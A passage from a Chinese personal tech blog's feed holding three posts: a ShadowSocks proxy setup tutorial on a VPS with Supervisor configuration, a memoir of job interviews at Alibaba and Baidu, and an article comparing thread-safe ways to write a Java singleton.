<p>ShadowSocks 说自己是一个「可穿透防火墙的轻量代理」。OK！这正是我想要的，能满足我科学上网的需求就够了。ShadowSocks 的 GitHub Wiki 主页上已经有详细的<a href="https://github.com/clowwindy/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" target="_blank" rel="external">中文使用说明</a>了。但作为搬运工，还是简要说明下吧。</p>
<p>1.在服务端安装 shadowsocks 库</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>apt-get <span class="keyword">install</span> python-pip
pip <span class="keyword">install</span> shadowsocks
</pre></td></tr></table></figure>

<p>2.创建配置文件<code>/etc/shadowsocks.json</code>。示例：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre>{
    "<span class="attribute">server</span>":<span class="value"><span class="string">"服务器 IP 地址"</span></span>,
    "<span class="attribute">server_port</span>":<span class="value"><span class="number">8388</span></span>,
    "<span class="attribute">local_address</span>": <span class="value"><span class="string">"127.0.0.1"</span></span>,
    "<span class="attribute">local_port</span>":<span class="value"><span class="number">1080</span></span>,
    "<span class="attribute">password</span>":<span class="value"><span class="string">"mypassword"</span></span>,
    "<span class="attribute">timeout</span>":<span class="value"><span class="number">300</span></span>,
    "<span class="attribute">method</span>":<span class="value"><span class="string">"aes-256-cfb"</span></span>,
    "<span class="attribute">fast_open</span>": <span class="value"><span class="literal">false</span></span>,
    "<span class="attribute">workers</span>": <span class="value"><span class="number">1</span>
</span>}
</pre></td></tr></table></figure><br>上述配置，只需要修改<code>server</code>和<code>password</code>，其他默认即可。<br><br>在服务器上运行 <code>ssserver -c /etc/shadowsocks.json</code> 即可。如果要在后台运行， 请使用 <a href="#后台运行">SuperVisor</a>.<br><br>3.在 Mac/Windows 推荐使用客户端 <a href="https://github.com/shadowsocks/shadowsocks-gui" target="_blank" rel="external">Shadowsocks GUI</a> 连接代理。配置也非常简单，注意server ip 和 password 改成自己的。<br><br><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1elejn2ajctj21040rs0vb.jpg" alt=""><br><br>Mac 端的启动后可以自动实现全局翻墙，并根据 GFWList 区分墙内外流量。Windows 端的需要配合浏览器代理一起使用，Chrome 的话推荐 <a href="https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm" target="_blank" rel="external">SwitchySharp</a>切换代理设置。把浏览器代理设为下列参数即可：<br><br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>协议: socks5
地址: 127.0.0.1
端口: 你填的 local_port
</pre></td></tr></table></figure>

<p>如果无法安装 SwitchySharp，可以先用下列参数启动 Chrome，强制它使用代理：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>Chrome<span class="built_in">.</span>exe <span class="subst">--</span>proxy<span class="attribute">-server</span><span class="subst">=</span><span class="string">"socks5://127.0.0.1:1080"</span> <span class="subst">--</span>host<span class="attribute">-resolver</span><span class="attribute">-rules</span><span class="subst">=</span><span class="string">"MAP * 0.0.0.0 , EXCLUDE localhost"</span>
</pre></td></tr></table></figure>

<p>移动端也可以参考<a href="https://github.com/clowwindy/shadowsocks/wiki/Ports-and-Clients" target="_blank" rel="external">Ports and Clients</a>下载对应软件。但是只能在其内置浏览器中翻墙，所以移动端上 ShadowSocks 就不如 VPN 方便。</p>
<p>4.完成</p>
<h2 id="后台运行">后台运行</h2>
<p>如果要在后台运行，请使用 <a href="https://github.com/clowwindy/shadowsocks/wiki/%E7%94%A8-Supervisor-%E8%BF%90%E8%A1%8C-Shadowsocks" target="_blank" rel="external">supervisor</a>。</p>
<p>执行</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>apt<span class="attribute">-get</span> update
apt<span class="attribute">-get</span> install python<span class="attribute">-pip</span> python<span class="attribute">-m2crypto</span> supervisor
pip install shadowsocks
</pre></td></tr></table></figure>

<p>编辑 <code>/etc/supervisor/conf.d/shadowsocks.conf</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
</pre></td><td class="code"><pre><span class="title">[program:shadowsocks]</span>
<span class="setting">command=<span class="value">ssserver -c /etc/shadowsocks.json</span></span>
<span class="setting">autorestart=<span class="value"><span class="keyword">true</span></span></span>
<span class="setting">user=<span class="value">nobody</span></span>
</pre></td></tr></table></figure>

<p>在 <code>/etc/default/supervisor</code> 最后加一行：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>ulimit <span class="attribute">-n</span> <span class="number">51200</span>
</pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>service supervisor <span class="operator"><span class="keyword">start</span>
supervisorctl reload</span>
</pre></td></tr></table></figure>

<p>如果遇到问题，可以检查日志：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>supervisorctl tail <span class="operator">-f</span> shadowsocks stderr
</pre></td></tr></table></figure>

<p>如果修改了 shadowsocks 配置 <code>/etc/shadowsocks.json</code>， 可以重启 shadowsocks：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>supervisorctl restart shadowsocks
</pre></td></tr></table></figure>

<p>如果修改了 Supervisor 的配置文件 /etc/supervisor/*， 可以更新 supervisor 配置：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>supervisorctl <span class="operator"><span class="keyword">update</span></span>
</pre></td></tr></table></figure>

<p>最后看看效果，访问 Google 和 Youtube 的速度如下：</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497tw1elejwjkbxij216g0x6qdd.jpg" alt=""></p>
<p>总体很满意，打开 Google 秒开，校园网看 Youtube 1080视频无压力。用来科学上网绝对是没问题了。甩 GoAgent 好几条街了。</p>
<h2 id="后记">后记</h2>
<p>DigitalOcean VPS + ShadowSocks 能基本满足翻墙的需求了。但是我说了用 VPS 来翻墙就大材小用了，如果你只是为了翻墙，或者你不是程序员，看到 VPS 什么的就头大，那最好的办法就是买个 VPN ，方便实惠速度又快。在这里我比较推荐 <a href="http://ugetvpn.com/?r=10ccb0196cc0a49b" target="_blank" rel="external">云梯VPN</a>，算是国内比较出色的一款服务，最低10元/月，基本上国外网站都是秒开，看Youtube视频无压力，配置安装基本都傻瓜一键式，覆盖多平台（我这么做广告，是不是应该给点广告费啊）。唯一要吐槽的就是居然只有包年套餐！</p>
<p>需要的可以走这里：<a href="http://ugetvpn.com/?r=10ccb0196cc0a49b" target="_blank" rel="external">云梯VPN</a>。线路推荐使用新加坡1号。</p>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>今天 <a href="https://www.glgoo.com/" target="_blank" rel="external">glgoo</a> 暂停服务了，赖以生存的 Google 曲线救国方案没了，GoAgent 又太慢，遂想折腾个 VPS 搭个代理解决科学上网的燃眉之急。</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1eldy44qjgcj20hu06b0u4.jpg" alt=""></p>
<p><a href="https://www.digitalocean.com/?refcode=54668030e22a" target="_blank" rel="external">DigitalOcean</a> 作为一个 VPS 提供商新秀，以其高性价比的优势一直与高富帅的老大哥 Linode 争夺市场。最近更是在 GitHub 针对高校学生的优惠活动「<a href="https://education.github.com/pack/" target="_blank" rel="external">GitHub Student Developer Pack</a>」中推出免费 $100 的优惠服务，如果以最便宜的 $5/月 计算，可以用小两年了。对于长这么大还没玩过VPS的孩子来说，这诱惑太大了。用VPS来翻墙当然有点大材小用了，更多的是想在VPS架一些自己的网站（非博客）、跑些脚本、学点东西。<br>]]></summary>
    
      <category term="翻墙" scheme="http://wuchong.me/tags/%E7%BF%BB%E5%A2%99/"/>
    
      <category term="VPS" scheme="http://wuchong.me/tags/VPS/"/>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[找工作小记——善待挫折]]></title>
    <link href="http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/"/>
    <id>http://wuchong.me/blog/2014/09/30/looking-for-a-job-summary/</id>
    <published>2014-09-30T04:22:01.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>马上就国庆假期了，自己的找工作历程也算是告一段落了。回首过往，这一路来的坎坎坷坷也算是颇为励志了，遂将心路历程一 一记载下来，希望能与大家共勉！本想写成一篇软文的，结果写着写着发现越写越像面经了，叹气！</p>
<p>目前参加面试的公司不多只有百度和阿里，拿到的 offer 也只有百度网页搜索部的 Rank 团队和架构团队，阿里共享业务事业部中间件团队。我不是大牛，没有拿过 ACM、机器人足球、挑战杯这些高大上的奖，没发过论文，因为是专硕还被鄙视过好多回。我只是一枚水硕，水了一年的研究生发现什么都没学到，平时做的更多的是“代码搬运工”的活儿。看着自己的项目没一个能拿的出手的，连面试官也说我的项目经验一般。而自己的实习生面试经历更是惨不忍睹，最终能拿到 offer，离不开自身的努力和运气吧！</p>
<h2 id="惨痛的实习生面试">惨痛的实习生面试</h2>
<p>认识我的朋友都知道进入阿里是我读研期间最大的梦想。而进入阿里巴巴实习是迈入阿里的第一步，我也把它看地非常重要。所以从寒假开始就有计划地推进着复习。然，事不遂人愿，有时候期望越大失望越大。信心满满地与小伙伴们参加完笔试后，耐心地等待面试通知。结果看着同学们一个个参加面试拿到实习 offer，最后自己的状态变成了“笔试未通过”，心理的打击确实挺大的。</p>
<p>之后退而求其次，想着实习能进BAT的其他两家也不错。腾讯的笔试顺利通过了，然而初面表现特别糟糕，先是走错了楼层再是拿着 Java 的简历面 C++ 岗，一些基础知识答的也很烂，果不其然一面被刷了，心情特别糟糕。之后又有百度的实习生面试，面的后台开发岗，一面说是过了，参加二面时却帮我推给了前端岗，心里特别不是滋味，然后就没有然后了。</p>
<p>就这样四月份经历了被 BAT 的轮番血虐后，有那么一段时间甚至开始怀疑自己，自己真有那么差劲吗？</p>
<p>莎士比亚有言「不要只因一次失败，就放弃你原来决心想达到的目标」。毕竟还有内推和校招的机会，为了抓住仅剩的机会，放弃了寻找其他实习岗位和公司，并给自己列了一个 To-Do List，我相信只要我能完成这个 List 上的所有任务，BAT 绝对没有问题！最后我只完成了一半，就拿到了理想的 offer。<br><a id="more"></a></p>
<h2 id="阿里内推">阿里内推</h2>
<p>7月初，阿里今年内推开始地特别早。那时候，我才将实验室项目告一段落，阿里大数据竞赛也进入了最后冲刺阶段，To-Do List 才开始做第一项。</p>
<p>阿里笔试失败给我最大的教训就是笔试能躲则躲，而且今年内推的政策是不影响校招，所以果断就内推了。但是没有认识的学长在阿里，就去论坛上找了个学长，在微博上又找了个，两边一起推。等了好久，却一封内推信都没收到。有些忧伤，询问之后得知简历未通过，原因项目经历欠佳，那一瞬巨大的失落感席卷全身。与学长一番交流后答应帮我内推了，我也认识到简历中存在的一些问题。没办法，只能够拼命补基础知识，扩展知识广度和深度了。</p>
<h3 id="一面">一面</h3>
<p>25日，正在为大数据竞赛训练一个模型，接到了来自杭州的电话。一面就这样开始了，师兄非常的和善，整个面试过程也很轻松，项目、算法、分布式、Linux、Vim 的一些问题也都回答的很顺。电面过程持续了大概半个小时。末了，我问师兄花名，师兄说等你进来就知道了（知道花名的条件是要先拿到 offer 啊）。</p>
<h3 id="二面">二面</h3>
<p>29日，这天是阿里大数据竞赛的最后一天，早起看了分数，接受了我已无望重返前50的现实，也就是说这四五个月来的辛苦没有换来任何的奖励。不过我认为，「有时候你的付出不见得能得到等值的结果，但你的收获也没必要用结果取衡量」。事实是，这次失败的经历对我之后的面试帮助特别大。</p>
<p>这一天，也是我内推二面的当天。很奇怪大家一二面都是电面，而我是通知的去大望路参加二面。二面官看起来非常的亲切，交流起来让人觉得很舒服，所以整个面试气氛并不紧张。二面官先是从我的项目入手，从遇到的问题延伸到大数据量下的解决方案。这个问题的讨论大概花了面试一半的时间，而另一半的时间则主要在讨论面试官出的一道比较变态的多线程问题。面试官提出一个多线程应用的具体背景，需要高效的解决方案。从来没遇到过类似的问题，心理有些不知所措，提了很多解决方案都被否决了。还好在最后答出了大致正确的方案。是的，整个面试过程大概40分钟，面试官只问了我这两个主要的问题。而这中间大多都是在经历提方案-被否决-提方案-被否决的过程，幸好最终侥幸答对了。后来我问面试官，为什么不考些算法题，面试官的意思是他不喜欢考算法，更喜欢实际的应用解决方案题，更能看出一个人的知识广度深度和潜力。确实，我也觉得算法题太应试教育了，但没办法，题还是得刷。回来路上刷新了自己的状态发现二面通过，很庆幸。不过这次面试让我看到自己对分布式、多线程知识掌握地并不扎实，回来后，重新调整了 To-Do List 的计划。</p>
<p>后来得知二面官是北京中间件的主管，很遗憾的是，他最近主持的一期「阿里技术沙龙」没能去参加。少了一次接近大神的机会，希望以后还能有机会学习吧。</p>
<h2 id="百度内推插曲">百度内推插曲</h2>
<p>在阿里二面到终面间大概有一两个月的空档期，在这之间参加了百度大搜索的内推。百度的内推比较乱，简历并不会上锁，一份简历居然可以被多个团队看到。所以就参加了两次内推面试。</p>
<p>第一次面试是网页搜索部的 Rank 团队，先进行的电面，问题很像阿里内推一面，也很顺利，就最后有一个字符串编辑距离的算法题没回答好。后来还是被邀请去百度大厦二面了。二面官很喜欢算法题，每一道算法都会问复杂度是多少，有没有更优/其他解法，有的还需要手写代码，后来知道他们是 Rank 团队，所以整天都是跟算法、复杂度打交道。三面是经理面，到这儿技术一般是没问题了，所以问的问题更像是HR面的问题，考核的内容更侧重于对待技术的热情，做事是否踏实，与人的沟通交流能力，面对挫折时的表现等方面。</p>
<p>另一次面试是网页搜索部的架构团队，接到通知时我解释已经面过其他部门了，然而还是要求我去参加面试，无奈就当积累经验了。面试当天正好是百度的 Summer Party ，心里总想着赶紧面完去见下李彦宏和张杰…一面二面的内容都差不多，印象比较深刻的是手写了 MapReduce，考了 HTTP 协议内容，数据库索引底层实现等等。三面与 Rank 团队的三面内容差不多，更多是他一直在说，说到他们最近在开发的存储架构，说到百度开源文化与阿里的差距。</p>
<p>百度面试的好处是一天全部面完，很痛快，不像阿里那样战线拉地老长。不过连着面四五个小时确实是够累的。面完一星期后，在公交车上连续接到两个百度 HR 的电话，通知已经通过了部门的面试。</p>
<h2 id="阿里终面">阿里终面</h2>
<p>预约的9月22号早上11点的场，提前半小时到了那，第一次被如此火爆的招聘现场给震惊到了。反正是比预约时间晚了一小时才面上… 阿里的工作人员和面试官们真是辛苦了！</p>
<h3 id="三面">三面</h3>
<p>三面应该是传说中的交叉面吧，其实就是工作人员随机地帮我选一个面试官。面试官长地特像非诚勿扰的孟非，笑起来真是一模一样，特有喜感。所以整个面试经过是我经历过的最轻松的。一上来，面试官就和我聊家乡和意向工作地点，又跟我抱怨后悔当初没选杭州。之后就进入正题开始让我自我介绍，然后一个个讨论我的项目，后来他分析说我的项目只能说一般。然后他说，我考你道题吧，他模拟出当时遇到的一个有关 mysql 索引的问题，结果我答错了。然后又问我能说说 Java 内存管理的东西吗，我就开始说“ Java 堆内存分为新生代、老年代…”就被他打住了。他说不用说了，一般人连这两个都不清楚。真是汗啊。然后就给我说他们面试主要考察这几方面的内容：基础能力（这部分很不错），项目/论文能力（这部分一般），对技术的热情（很不错），对未来工作的具体打算，对新技术/开源项目的了解程度。所以后面就主要讨论后两部分的内容。最后评分的时候“孟非”说给你A吧！您还真是一点都不隐藏啊。</p>
<h3 id="四面">四面</h3>
<p>三面结束后被带到等候区等待结果。看到不断有简历拿进来，每念到一个名字就让回家，真是够残酷的。这时候已经中午了，吃完免费午餐后进入第四面。本以为第四面是HR面，结果还是技术面。面试官是一个不苟言笑的技术大牛，虽然我极力想让面试气氛轻松下来，还是感觉面试的气压很低。四面官对于每一个技术细节都问的很深入，聊项目时深入到写出算法代码，聊 JVM 时要求讲出7种垃圾收集器及其原理，讲到 CMS 收集器时要求说出其工作过程以及针对停顿的优化方案。最后也问了和三面相似的问题，对于一些开源项目的了解。而从面试官脸上完全看不出答得好坏，这更让我心虚了。</p>
<h3 id="五面（HR面）">五面（HR面）</h3>
<p>四面结束后还是回到等候区等待，这回学聪明了，刷新了一下个人主页发现四面通过了。等了有一会儿终于被拉到 HR 场子面最后一轮了。阿里的 HR 拥有生死判决的能力，所以对于阿里 HR 面大家总是人心惶惶的。HR 面试官一边问我问题，一边在纸上做笔记，有种在做笔供的错觉。HR 的问题动不动就要我回答出三点，这可真是有些难着我了。</p>
<p>面完HR面后，心里反倒不像之前那么自信了。看了个人主页上的状态变成“面试结束”，更是让人心情沉重起来。因为之前有好多挂在了这个状态上的同学。逛了各大 bbs 后发现好多人都是这个状态，看来自己真的成了云备胎了。</p>
<p>经过五天的漫长的煎熬和等待，终于在26号晚上接到了HR的电话通知参加 offer party 。至此，悬着的心终于放下了。找工作的任务也算是圆满结束了。</p>
<h2 id="小记">小记</h2>
<p>百度今年研发工资有了普调，给出的薪水非常有竞争力，再加上后面的4S计划，还是很令人心动的。然，阿里给了A offer，薪水上还是要高于百度，更重要的是阿里是我梦寐以求的公司，其部门团队、工作地点、生活质量都更合我的心意。所以，辛苦百度 HR 姐姐的开导了。</p>
<h2 id="冥冥之中，自有注定">冥冥之中，自有注定</h2>
<p>我相信事在人为，但一切又像是冥冥之中自有注定一样。我是非常非常幸运的，所以我会感谢我遇到的所有挫折与顺利。如果当初实习生面试通过了，我可能会去杭州实习，少了我的支持与帮助女朋友很可能进不了阿里，我们也不可能一起成为双职工；如果当初内推简历太顺利，我可能进的就不是最希望的中间件了；如果当初没错过HR电话，参加了提前批终面，少了这一个月的缓冲，我可能就拿不了 A 评级。所以当遇到不顺的事情时，不必伤心抑郁，这可能是为了一些发生更好的事情。</p>
<p>如果你正在发生一些不顺的事情，把她当做一种财富吧，相信通过不懈的奋斗和努力，最终都能拿到好 offer 的！</p>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>马上就国庆假期了，自己的找工作历程也算是告一段落了。回首过往，这一路来的坎坎坷坷也算是颇为励志了，遂将心路历程一 一记载下来，希望能与大家共勉！本想写成一篇软文的，结果写着写着发现越写越像面经了，叹气！</p>
<p>目前参加面试的公司不多只有百度和阿里，拿到的 offer 也只有百度网页搜索部的 Rank 团队和架构团队，阿里共享业务事业部中间件团队。我不是大牛，没有拿过 ACM、机器人足球、挑战杯这些高大上的奖，没发过论文，因为是专硕还被鄙视过好多回。我只是一枚水硕，水了一年的研究生发现什么都没学到，平时做的更多的是“代码搬运工”的活儿。看着自己的项目没一个能拿的出手的，连面试官也说我的项目经验一般。而自己的实习生面试经历更是惨不忍睹，最终能拿到 offer，离不开自身的努力和运气吧！</p>
<h2 id="惨痛的实习生面试">惨痛的实习生面试</h2>
<p>认识我的朋友都知道进入阿里是我读研期间最大的梦想。而进入阿里巴巴实习是迈入阿里的第一步，我也把它看地非常重要。所以从寒假开始就有计划地推进着复习。然，事不遂人愿，有时候期望越大失望越大。信心满满地与小伙伴们参加完笔试后，耐心地等待面试通知。结果看着同学们一个个参加面试拿到实习 offer，最后自己的状态变成了“笔试未通过”，心理的打击确实挺大的。</p>
<p>之后退而求其次，想着实习能进BAT的其他两家也不错。腾讯的笔试顺利通过了，然而初面表现特别糟糕，先是走错了楼层再是拿着 Java 的简历面 C++ 岗，一些基础知识答的也很烂，果不其然一面被刷了，心情特别糟糕。之后又有百度的实习生面试，面的后台开发岗，一面说是过了，参加二面时却帮我推给了前端岗，心里特别不是滋味，然后就没有然后了。</p>
<p>就这样四月份经历了被 BAT 的轮番血虐后，有那么一段时间甚至开始怀疑自己，自己真有那么差劲吗？</p>
<p>莎士比亚有言「不要只因一次失败，就放弃你原来决心想达到的目标」。毕竟还有内推和校招的机会，为了抓住仅剩的机会，放弃了寻找其他实习岗位和公司，并给自己列了一个 To-Do List，我相信只要我能完成这个 List 上的所有任务，BAT 绝对没有问题！最后我只完成了一半，就拿到了理想的 offer。<br>]]></summary>
    
      <category term="面经" scheme="http://wuchong.me/tags/%E9%9D%A2%E7%BB%8F/"/>
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="职场生涯" scheme="http://wuchong.me/categories/%E8%81%8C%E5%9C%BA%E7%94%9F%E6%B6%AF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何正确地写出单例模式]]></title>
    <link href="http://wuchong.me/blog/2014/08/28/how-to-correctly-write-singleton-pattern/"/>
    <id>http://wuchong.me/blog/2014/08/28/how-to-correctly-write-singleton-pattern/</id>
    <published>2014-08-28T08:43:39.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>单例模式算是设计模式中最容易理解，也是最容易手写代码的模式了吧。但是其中的坑却不少，所以也常作为面试题来考。本文主要对几种单例写法的整理，并分析其优缺点。很多都是一些老生常谈的问题，但如果你不知道如何创建一个线程安全的单例，不知道什么是双检锁，那这篇文章可能会帮助到你。</p>
<h2 id="懒汉式，线程不安全">懒汉式，线程不安全</h2>
<p>当被问到要实现一个单例模式时，很多人的第一反应是写出如下的代码，包括教科书上也是这样教我们的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> {</span>
    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;
    <span class="keyword">private</span> <span class="title">Singleton</span> (){}

    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span>() {
     <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {
         instance = <span class="keyword">new</span> Singleton();
     }
     <span class="keyword">return</span> instance;
    }
}
</pre></td></tr></table></figure>

<p>这段代码简单明了，而且使用了懒加载模式，但是却存在致命的问题。当有多个线程并行调用 getInstance() 的时候，就会创建多个实例。也就是说在多线程下不能正常工作。<br><a id="more"></a></p>
<h2 id="懒汉式，线程安全">懒汉式，线程安全</h2>
<p>为了解决上面的问题，最简单的方法是将整个 getInstance() 方法设为同步（synchronized）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span>() {
    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {
        instance = <span class="keyword">new</span> Singleton();
    }
    <span class="keyword">return</span> instance;
}
</pre></td></tr></table></figure>

<p>虽然做到了线程安全，并且解决了多实例的问题，但是它并不高效。因为在任何时候只能有一个线程调用 getInstance() 方法。但是同步操作只需要在第一次调用时才被需要，即第一次创建单例实例对象时。这就引出了双重检验锁。</p>
<h2 id="双重检验锁">双重检验锁</h2>
<p>双重检验锁模式（double checked locking pattern），是一种使用同步块加锁的方法。程序员称其为双重检查锁，因为会有两次检查 <code>instance == null</code>，一次是在同步块外，一次是在同步块内。为什么在同步块内还要再检验一次？因为可能会有多个线程一起进入同步块外的 if，如果在同步块内不进行二次检验的话就会生成多个实例了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span>() {
    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {                         <span class="comment">//Single Checked</span>
        <span class="keyword">synchronized</span> (Singleton.class) {
            <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {                 <span class="comment">//Double Checked</span>
                instance = <span class="keyword">new</span> Singleton();
            }
        }
    }
    <span class="keyword">return</span> instance ;
}
</pre></td></tr></table></figure>

<p>这段代码看起来很完美，很可惜，它是有问题。主要在于<code>instance = new Singleton()</code>这句，这并非是一个原子操作，事实上在 JVM 中这句话大概做了下面 3 件事情。</p>
<ol>
<li>给 instance 分配内存</li>
<li>调用 Singleton 的构造函数来初始化成员变量</li>
<li>将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了）</li>
</ol>
<p>但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。</p>
<p>我们只需要将 instance 变量声明成 volatile 就可以了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> {</span>
    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance; <span class="comment">//声明成 volatile</span>
    <span class="keyword">private</span> <span class="title">Singleton</span> (){}

    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span>() {
        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {                         
            <span class="keyword">synchronized</span> (Singleton.class) {
                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {       
                    instance = <span class="keyword">new</span> Singleton();
                }
            }
        }
        <span class="keyword">return</span> instance;
    }
   
}
</pre></td></tr></table></figure>

<p>有些人认为使用 volatile 的原因是可见性，也就是可以保证线程在本地不会存有 instance 的副本，每次都是去主内存中读取。但其实是不对的。使用 volatile 的主要原因是其另一个特性：禁止指令重排序优化。也就是说，在 volatile 变量的赋值操作后面会有一个内存屏障（生成的汇编代码上），读操作不会被重排序到内存屏障之前。比如上面的例子，取操作必须在执行完 1-2-3 之后或者 1-3-2 之后，不存在执行到 1-3 然后取到值的情况。从「先行发生原则」的角度理解的话，就是对于一个 volatile 变量的写操作都先行发生于后面对这个变量的读操作（这里的“后面”是时间上的先后顺序）。</p>
<p>但是特别注意在 Java 5 以前的版本使用了 volatile 的双检锁还是有问题的。其原因是 Java 5 以前的 JMM （Java 内存模型）是存在缺陷的，即时将变量声明成 volatile 也不能完全避免重排序，主要是 volatile 变量前后的代码仍然存在重排序问题。这个 volatile 屏蔽重排序的问题在 Java 5 中才得以修复，所以在这之后才可以放心使用 volatile。</p>
<p>相信你不会喜欢这种复杂又隐含问题的方式，当然我们有更好的实现线程安全的单例模式的办法。</p>
<h2 id="饿汉式_static_final_field">饿汉式 static final field</h2>
<p>这种方法非常简单，因为单例的实例被声明成 static 和 final 变量了，在第一次加载类到内存中时就会初始化，所以创建实例本身是线程安全的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>{</span>
    <span class="comment">//类加载时就初始化</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton instance = <span class="keyword">new</span> Singleton();
    
    <span class="keyword">private</span> <span class="title">Singleton</span>(){}

    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span>(){
        <span class="keyword">return</span> instance;
    }
}
</pre></td></tr></table></figure>

<p>这种写法如果完美的话，就没必要在啰嗦那么多双检锁的问题了。缺点是它不是一种懒加载模式（lazy initialization），单例会在加载类后一开始就被初始化，即使客户端没有调用 getInstance()方法。饿汉式的创建方式在一些场景中将无法使用：譬如 Singleton 实例的创建是依赖参数或者配置文件的，在 getInstance() 之前必须调用某个方法设置参数给它，那样这种单例写法就无法使用了。 </p>
<h2 id="静态内部类_static_nested_class">静态内部类 static nested class</h2>
<p>我比较倾向于使用静态内部类的方法，这种方法也是《Effective Java》上所推荐的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> {</span>  
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> {</span>  
        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();  
    }  
    <span class="keyword">private</span> <span class="title">Singleton</span> (){}  
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton <span class="title">getInstance</span>() {  
        <span class="keyword">return</span> SingletonHolder.INSTANCE; 
    }  
}
</pre></td></tr></table></figure>

<p>这种写法仍然使用JVM本身机制保证了线程安全问题；由于 SingletonHolder 是私有的，除了 getInstance() 之外没有办法访问它，因此它是懒汉式的；同时读取实例的时候不会进行同步，没有性能缺陷；也不依赖 JDK 版本。</p>
<h2 id="枚举_Enum">枚举 Enum</h2>
<p>用枚举写单例实在太简单了！这也是它最大的优点。下面这段代码就是声明枚举实例的通常做法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="keyword">enum</span> EasySingleton{
    INSTANCE;
}
</pre></td></tr></table></figure>

<p>我们可以通过EasySingleton.INSTANCE来访问实例，这比调用getInstance()方法简单多了。创建枚举默认就是线程安全的，所以不需要担心double checked locking，而且还能防止反序列化导致重新创建新的对象。但是还是很少看到有人这样写，可能是因为不太熟悉吧。</p>
<h2 id="总结">总结</h2>
<p>一般来说，单例模式有五种写法：懒汉、饿汉、双重检验锁、静态内部类、枚举。上述所说都是线程安全的实现，文章开头给出的第一种方法不算正确的写法。</p>
